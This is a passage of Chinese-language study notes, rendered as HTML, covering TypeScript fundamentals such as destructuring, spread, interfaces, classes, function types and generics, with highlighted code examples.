个对象。但 <code>let</code> 在一个作用域里的同名变量只能声明一次。</p>\n<h2 id=\"const-声明\"><a href=\"#const-声明\" class=\"headerlink\" title=\"const 声明\"></a><code>const</code> 声明</h2><p>拥有与 <code>let</code> 声明相同的作用域规则，但给变量声明赋值后不能再重新赋值。</p>\n<p><code>const</code> 声明的变量所引用的值是不可变的，但变量的内部状态是可以改变的。</p>\n<p>TypeScript 允许将对象的成员设置成只读。</p>\n<h2 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h2><ul>\n<li><p>解构数组</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 相当于使用索引</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> input = [<span class=\"number\">1</span>, <span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> [first, second] = input</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first) <span class=\"comment\">// outputs 1</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(second) <span class=\"comment\">// outputs 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用...语法创建剩余变量</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> [first, ...rest] = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first) <span class=\"comment\">// outputs 1</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(rest) <span class=\"comment\">// outputs [ 2, 3, 4 ]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// swap variables</span></span><br><span class=\"line\">;[first, second] = [second, first]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>解构对象</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> o = &#123;</span><br><span class=\"line\">  <span class=\"attr\">a</span>: <span class=\"string\">&#x27;foo&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">b</span>: <span class=\"number\">12</span>,</span><br><span class=\"line\">  <span class=\"attr\">c</span>: <span class=\"string\">&#x27;bar&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> &#123; a, b &#125; = o</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 可以用没有声明的赋值</span></span><br><span class=\"line\">;(&#123; a, b &#125; = &#123; <span class=\"attr\">a</span>: <span class=\"string\">&#x27;baz&#x27;</span>, <span class=\"attr\">b</span>: <span class=\"number\">101</span> &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用...语法创建剩余变量</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> &#123; a, ...passthrough &#125; = o</span><br><span class=\"line\"><span class=\"keyword\">let</span> total = passthrough.<span class=\"property\">b</span> + passthrough.<span class=\"property\">c</span>.<span class=\"property\">length</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>属性重命名</p>\n</li>\n<li><p>默认值</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">keepWholeObject</span>(<span class=\"params\">wholeObject: &#123; a: <span class=\"built_in\">string</span>; b?: <span class=\"built_in\">number</span> &#125;</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; a, b = <span class=\"number\">1001</span> &#125; = wholeObject</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>函数声明</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 指定默认值</span></span><br><span class=\"line\"><span class=\"comment\">// 首先，需要在默认值之前设置其格式。</span></span><br><span class=\"line\"><span class=\"comment\">// 其次，需要在解构属性上给予一个默认或可选的属性用来替换主初始化列表。</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">f</span>(<span class=\"params\">&#123; a, b = <span class=\"number\">0</span> &#125; = &#123; a: <span class=\"string\">&#x27;&#x27;</span> &#125;</span>): <span class=\"built_in\">void</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_\">f</span>(&#123; <span class=\"attr\">a</span>: <span class=\"string\">&#x27;yes&#x27;</span> &#125;) <span class=\"comment\">// ok, default b = 0</span></span><br><span class=\"line\"><span class=\"title function_\">f</span>() <span class=\"comment\">// ok, default to &#123;a: &quot;&quot;&#125;, which then defaults b = 0</span></span><br><span class=\"line\"><span class=\"title function_\">f</span>(&#123;&#125;) <span class=\"comment\">// error, &#x27;a&#x27; is required if you supply an argument</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解构表达式要尽量保持小而简单</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"展开\"><a href=\"#展开\" class=\"headerlink\" title=\"展开\"></a>展开</h2><p>展开操作符正与解构相反。它允许你将一个数组展开为另一个数组，或将一个对象展开为另一个对象。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 解构数组</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> first = [<span class=\"number\">1</span>, <span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> second = [<span class=\"number\">3</span>, <span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> bothPlus = [<span class=\"number\">0</span>, ...first, ...second, <span class=\"number\">5</span>] <span class=\"comment\">// bothPlus = [0, 1, 2, 3, 4, 5]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解构对象</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> defaults = &#123; <span class=\"attr\">food</span>: <span class=\"string\">&#x27;spicy&#x27;</span>, <span class=\"attr\">price</span>: <span class=\"string\">&#x27;$$&#x27;</span>, <span class=\"attr\">ambiance</span>: <span class=\"string\">&#x27;noisy&#x27;</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> search = &#123; ...defaults, <span class=\"attr\">food</span>: <span class=\"string\">&#x27;rich&#x27;</span> &#125; <span class=\"comment\">// search = &#123; food: &quot;rich&quot;, price: &quot;$$&quot;, ambiance: &quot;noisy&quot; &#125;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>注意</strong></p>\n<ul>\n<li>对象的展开比数组的展开要复杂的多。像数组展开一样，它是从左至右进行处理，但结果仍为对象。这就意味着出现在展开对象后面的属性会覆盖前面的属性。</li>\n<li>对象展开仅包含对象自身的可枚举属性。展开一个对象实例时，会丢失其方法。</li>\n<li>TypeScript 编译器不允许展开泛型函数上的类型参数。</li>\n</ul>\n<h1 id=\"接口-interface\"><a href=\"#接口-interface\" class=\"headerlink\" title=\"接口 - interface\"></a>接口 - interface</h1><p>TypeScript 的核心原则之一是对值所具有的结构进行类型检查。它有时被称做“鸭式辨型法”或“结构性子类型化”。</p>\n<p>在 TypeScript 里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。</p>\n<p>在调用函数时，传入的对象参数实际上会包含很多属性，但是编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。</p>\n<h2 id=\"可选属性\"><a href=\"#可选属性\" class=\"headerlink\" title=\"可选属性\"></a>可选属性</h2><p>带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个 <code>?</code> 符号。</p>\n<p>可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。</p>\n<h2 id=\"只读属性\"><a href=\"#只读属性\" class=\"headerlink\" title=\"只读属性\"></a>只读属性</h2><p>可以在属性名前用 readonly 来指定只读属性。满足对象创建后不能修改属性值的限制。</p>\n<p>TypeScript 具有 <code>ReadonlyArray&lt;T&gt;</code> 类型，它与 <code>Array&lt;T&gt;</code> 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">a</span>: <span class=\"built_in\">number</span>[] = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">ro</span>: <span class=\"title class_\">ReadonlyArray</span>&lt;<span class=\"built_in\">number</span>&gt; = a</span><br><span class=\"line\">ro[<span class=\"number\">0</span>] = <span class=\"number\">12</span> <span class=\"comment\">// error!</span></span><br><span class=\"line\">ro.<span class=\"title function_\">push</span>(<span class=\"number\">5</span>) <span class=\"comment\">// error!</span></span><br><span class=\"line\">ro.<span class=\"property\">length</span> = <span class=\"number\">100</span> <span class=\"comment\">// error!</span></span><br><span class=\"line\">a = ro <span class=\"comment\">// error!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 不过可以用类型断言重写</span></span><br><span class=\"line\">a = ro <span class=\"keyword\">as</span> <span class=\"built_in\">number</span>[]</span><br></pre></td></tr></table></figure>\n\n<p>最简单判断该用 readonly 还是 const 的方法是看要把它做为变量使用还是做为一个属性。</p>\n<p>做为变量使用的话用 const，若做为属性则使用 readonly。</p>\n<h2 id=\"额外的属性检查\"><a href=\"#额外的属性检查\" class=\"headerlink\" title=\"额外的属性检查\"></a>额外的属性检查</h2><p>对象字面量会被特殊对待而且会经过额外属性检查，当将它们赋值给变量或作为参数传递的时候。如果一个对象字面量存在任何“目标类型”不包含的属性时，你会得到一个错误。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">SquareConfig</span> &#123;</span><br><span class=\"line\">  color?: <span class=\"built_in\">string</span></span><br><span class=\"line\">  width?: <span class=\"built_in\">number</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">createSquare</span>(<span class=\"params\">config: SquareConfig</span>): &#123; <span class=\"attr\">color</span>: <span class=\"built_in\">string</span>; <span class=\"attr\">area</span>: <span class=\"built_in\">number</span> &#125; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// error: &#x27;colour&#x27; not expected in type &#x27;SquareConfig&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> mySquare = <span class=\"title function_\">createSquare</span>(&#123; <span class=\"attr\">colour</span>: <span class=\"string\">&#x27;red&#x27;</span>, <span class=\"attr\">width</span>: <span class=\"number\">100</span> &#125;)</span><br></pre></td></tr></table></figure>\n\n<p>绕开这些检查非常简单。最简便的方法是使用类型断言。但最佳的方式是能够添加一个字符串索引签名。最后一种跳过这些检查的方式是将这个对象赋值给一个另一个变量。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// as断言</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> mySquare = <span class=\"title function_\">createSquare</span>(&#123; <span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">opacity</span>: <span class=\"number\">0.5</span> &#125; <span class=\"keyword\">as</span> <span class=\"title class_\">SquareConfig</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果SquareConfig带有上面定义的类型的color和width属性，并且还会带有任意数量的其它属性，那么我们可以这样定义它</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">SquareConfig</span> &#123;</span><br><span class=\"line\">  color?: <span class=\"built_in\">string</span></span><br><span class=\"line\">  width?: <span class=\"built_in\">number</span></span><br><span class=\"line\">  [<span class=\"attr\">propName</span>: <span class=\"built_in\">string</span>]: <span class=\"built_in\">any</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 因为squareOptions不会经过额外属性检查，所以编译器不会报错</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> squareOptions = &#123; <span class=\"attr\">colour</span>: <span class=\"string\">&#x27;red&#x27;</span>, <span class=\"attr\">width</span>: <span class=\"number\">100</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> mySquare = <span class=\"title function_\">createSquare</span>(squareOptions)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数类型\"><a href=\"#函数类型\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h2><p>为了使用接口表示函数类型，我们需要给接口定义一个调用签名。它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。</p>\n<p>对于函数类型的类型检查来说，函数的参数名不需要与接口里定义的名字相匹配。TypeScript 编译器会要求对应位置上的参数类型是兼容的，如果不指定类型，TypeScript 的类型系统会推断出参数类型。</p>\n<h2 id=\"可索引的类型\"><a href=\"#可索引的类型\" class=\"headerlink\" title=\"可索引的类型\"></a>可索引的类型</h2><p>可索引类型具有一个索引签名，它描述了对象索引的类型，还有相应的索引返回值类型。</p>\n<p>支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">name</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Dog</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">breed</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 错误：使用&#x27;string&#x27;索引，有时会得到Animal!</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">NotOkay</span> &#123;</span><br><span class=\"line\">  [<span class=\"attr\">x</span>: <span class=\"built_in\">number</span>]: <span class=\"title class_\">Animal</span></span><br><span class=\"line\">  [<span class=\"attr\">x</span>: <span class=\"built_in\">string</span>]: <span class=\"title class_\">Dog</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>字符串索引签名能够很好的描述 <code>dictionary</code> 模式，并且它们也会确保所有属性与其返回值类型相匹配。</p>\n<p>可以将索引签名设置为只读，这样就防止了给索引赋值。</p>\n<h2 id=\"类类型\"><a href=\"#类类型\" class=\"headerlink\" title=\"类类型\"></a>类类型</h2><h3 id=\"implements-实现接口\"><a href=\"#implements-实现接口\" class=\"headerlink\" title=\"implements 实现接口\"></a><code>implements</code> 实现接口</h3><p>与 C# 或 Java 里接口的基本作用一样，TypeScript 也能够用它来明确的强制一个类去符合某种契约。</p>\n<p>也可以在接口中描述一个方法，在类里实现它。接口描述了类的公共部分，而不是公共和私有两部分。它不会帮你检查类是否具有某些私有成员。</p>\n<h3 id=\"类静态部分与实例部分的区别\"><a href=\"#类静态部分与实例部分的区别\" class=\"headerlink\" title=\"类静态部分与实例部分的区别\"></a>类静态部分与实例部分的区别</h3><p>类是具有两个类型的：静态部分的类型和实例的类型。</p>\n<p>当一个类实现了一个接口时，只对其实例部分进行类型检查。 constructor 存在于类的静态部分，所以不在检查的范围内。因此，我们应该直接操作类的静态部分。</p>\n<h3 id=\"extends-继承接口\"><a href=\"#extends-继承接口\" class=\"headerlink\" title=\"extends 继承接口\"></a><code>extends</code> 继承接口</h3><p>和类一样，接口也可以相互继承。这让我们能够从一个接口里复制成员到另一个接口里，可以更灵活地将接口分割到可重用的模块里，并通过继承多个接口创建合成接口。</p>\n<h2 id=\"混合类型\"><a href=\"#混合类型\" class=\"headerlink\" title=\"混合类型\"></a>混合类型</h2><blockquote>\n<p>不懂</p>\n</blockquote>\n<p>一个例子就是，一个对象可以同时做为函数和对象使用，并带有额外的属性。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Counter</span> &#123;</span><br><span class=\"line\">  (<span class=\"attr\">start</span>: <span class=\"built_in\">number</span>): <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">interval</span>: <span class=\"built_in\">number</span></span><br><span class=\"line\">  <span class=\"title function_\">reset</span>(): <span class=\"built_in\">void</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getCounter</span>(<span class=\"params\"></span>): <span class=\"title class_\">Counter</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> counter = &lt;<span class=\"title class_\">Counter</span>&gt;<span class=\"keyword\">function</span> (<span class=\"params\">start: <span class=\"built_in\">number</span></span>) &#123;&#125;</span><br><span class=\"line\">  counter.<span class=\"property\">interval</span> = <span class=\"number\">123</span></span><br><span class=\"line\">  counter.<span class=\"property\">reset</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;&#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> counter</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = <span class=\"title function_\">getCounter</span>()</span><br><span class=\"line\"><span class=\"title function_\">c</span>(<span class=\"number\">10</span>)</span><br><span class=\"line\">c.<span class=\"title function_\">reset</span>()</span><br><span class=\"line\">c.<span class=\"property\">interval</span> = <span class=\"number\">5.0</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"接口继承类\"><a href=\"#接口继承类\" class=\"headerlink\" title=\"接口继承类\"></a>接口继承类</h2><p>当接口继承了一个类类型时，它会继承类的成员但不包括其实现。</p>\n<p>接口同样会继承到类的 private 和 protected 成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）。</p>\n<h1 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h1><h2 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h2><p>类从基类中继承了属性和方法。派生类通常被称作子类，基类通常被称作超类。</p>\n<p>派生类在自己的构造函数里必须调用 super()，即基类的构造函数。且访问 this 的属性之前，一定要调用 super()。</p>\n<h2 id=\"公共，私有与受保护的修饰符\"><a href=\"#公共，私有与受保护的修饰符\" class=\"headerlink\" title=\"公共，私有与受保护的修饰符\"></a>公共，私有与受保护的修饰符</h2><h3 id=\"public\"><a href=\"#public\" class=\"headerlink\" title=\"public\"></a><code>public</code></h3><p>在 TypeScript 里，成员都默认为 <code>public</code></p>\n<h3 id=\"private\"><a href=\"#private\" class=\"headerlink\" title=\"private\"></a><code>private</code></h3><p>不能在声明它的类的外部访问 <code>private</code> 成员。</p>\n<h3 id=\"protected\"><a href=\"#protected\" class=\"headerlink\" title=\"protected\"></a><code>protected</code></h3><p><code>protected</code> 成员在派生类中仍然可以访问。</p>\n<h3 id=\"readonly-修饰符\"><a href=\"#readonly-修饰符\" class=\"headerlink\" title=\"readonly 修饰符\"></a><code>readonly</code> 修饰符</h3><p>可以使用 <code>readonly</code> 关键字将属性设置为只读的。只读属性必须在声明时或构造函数里被初始化。</p>\n<h2 id=\"存取器\"><a href=\"#存取器\" class=\"headerlink\" title=\"存取器\"></a>存取器</h2><p>TypeScript 支持通过 getters&#x2F;setters 来截取对对象成员的访问。它能帮助你有效的控制对对象成员的访问。</p>\n<ul>\n<li>存取器要求你将编译器设置为输出 ECMAScript 5 或更高。不支持降级到 ECMAScript 3</li>\n<li>只带有 <code>get</code> 不带有 <code>set</code> 的存取器自动被推断为 <code>readonly</code> 。</li>\n</ul>\n<h2 id=\"静态属性\"><a href=\"#静态属性\" class=\"headerlink\" title=\"静态属性\"></a>静态属性</h2><p>用 <code>static</code> 定义，这些属性存在于类本身上面而不是类的实例上。</p>\n<h2 id=\"抽象类\"><a href=\"#抽象类\" class=\"headerlink\" title=\"抽象类\"></a>抽象类</h2><p>不同于接口，抽象类可以包含成员的实现细节。 <code>abstract</code> 关键字是用于定义抽象类和在抽象类内部定义抽象方法。</p>\n<p>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。</p>\n<p>抽象方法必须包含 abstract 关键字并且可以包含访问修饰符。</p>\n<h1 id=\"函数-function\"><a href=\"#函数-function\" class=\"headerlink\" title=\"函数 - function\"></a>函数 - function</h1><blockquote>\n<p>在 JavaScript 里，函数可以使用函数体外部的变量。当函数这么做时，我们说它‘捕获’了这些变量。<br>函数中使用的捕获变量不会体现在类型里。 实际上，这些变量是函数的隐藏状态并不是组成 API 的一部分。</p>\n</blockquote>\n<h2 id=\"函数类型-1\"><a href=\"#函数类型-1\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h2><p>TypeScript 能够根据返回语句自动推断出返回值类型。</p>\n<p>函数类型包含两部分：参数类型和返回值类型。当写出完整函数类型的时候，这两部分都是需要的。函数的类型只是由参数类型和返回值组成的。</p>\n<ul>\n<li>我们以参数列表的形式写出参数类型，为每个参数指定一个名字和类型。只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确。</li>\n<li>对于返回值，我们在函数和返回值类型之前使用(&#x3D;&gt;)符号，如果函数没有返回任何值，也必须指定返回值类型为 void 而不能留空。</li>\n</ul>\n<h2 id=\"函数参数\"><a href=\"#函数参数\" class=\"headerlink\" title=\"函数参数\"></a>函数参数</h2><h3 id=\"可选参数和默认参数\"><a href=\"#可选参数和默认参数\" class=\"headerlink\" title=\"可选参数和默认参数\"></a>可选参数和默认参数</h3><p>TypeScript 里的每个函数参数都是必须的。 这是指编译器检查用户是否为每个参数都传入了值，传递给一个函数的参数个数必须与函数期望的参数个数一致。</p>\n<ul>\n<li>JavaScript 里，每个参数都是可选的，可传可不传。 没传参的时候，它的值就是 undefined。</li>\n<li>在 TypeScript 里我们可以在参数名旁使用?实现可选参数的功能。可选参数必须跟在必须参数后面。</li>\n</ul>\n<p>在 TypeScript 里，我们也可以为参数提供一个默认值当用户没有传递这个参数或传递的值是 undefined 时。 它们叫做有默认初始化值的参数。</p>\n<p>与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入 undefined 值来获得默认值。</p>\n<h3 id=\"剩余参数\"><a href=\"#剩余参数\" class=\"headerlink\" title=\"剩余参数\"></a>剩余参数</h3><p>在 JavaScript 里，你可以使用 arguments 来访问所有传入的参数。</p>\n<p>在 TypeScript 里，你可以把所有参数收集到一个变量里，剩余参数会被当做个数不限的可选参数。可以一个都没有，同样也可以有任意个。编译器创建参数数组，名字是你在省略号（…）后面给定的名字，你可以在函数体内使用这个数组。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">buildName</span>(<span class=\"params\">firstName: <span class=\"built_in\">string</span>, ...restOfName: <span class=\"built_in\">string</span>[]</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> firstName + <span class=\"string\">&#x27; &#x27;</span> + restOfName.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> employeeName = <span class=\"title function_\">buildName</span>(<span class=\"string\">&#x27;Joseph&#x27;</span>, <span class=\"string\">&#x27;Samuel&#x27;</span>, <span class=\"string\">&#x27;Lucas&#x27;</span>, <span class=\"string\">&#x27;MacKinzie&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">buildNameFun</span>: <span class=\"function\">(<span class=\"params\">fname: <span class=\"built_in\">string</span>, ...rest: <span class=\"built_in\">string</span>[]</span>) =&gt;</span> <span class=\"built_in\">string</span> = buildName</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"this\"></a><code>this</code></h2><p>JavaScript 里，<code>this</code> 的值在函数被调用的时候才会指定。</p>\n<p>当回调函数被调用时，它会被当成一个普通函数调用，<code>this</code> 将为 <code>undefined</code>，可以通过 <code>this</code> 参数来避免错误。</p>\n<h2 id=\"重载\"><a href=\"#重载\" class=\"headerlink\" title=\"重载\"></a>重载</h2><p>为同一个函数提供多个函数类型定义来进行函数重载。</p>\n<p>为了让编译器能够选择正确的检查类型，它与 JavaScript 里的处理流程相似。 它查找重载列表，尝试使用第一个重载定义。 如果匹配的话就使用这个。 因此，在定义重载的时候，一定要把最精确的定义放在最前面。</p>\n<h1 id=\"泛型-generic\"><a href=\"#泛型-generic\" class=\"headerlink\" title=\"泛型 - generic\"></a>泛型 - generic</h1><p>在像 C#和 Java 这样的语言中，可以使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据。这样用户就可以以自己的数据类型来使用组件。</p>\n<p>无法创建泛型枚举和泛型命名空间。</p>\n<p>example：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> identity&lt;T&gt;(<span class=\"attr\">arg</span>: T): T &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 定义了泛型函数后，可以用两种方法使用</span></span><br><span class=\"line\"><span class=\"comment\">// 第一种是，传入所有的参数，包含类型参数</span></span><br><span 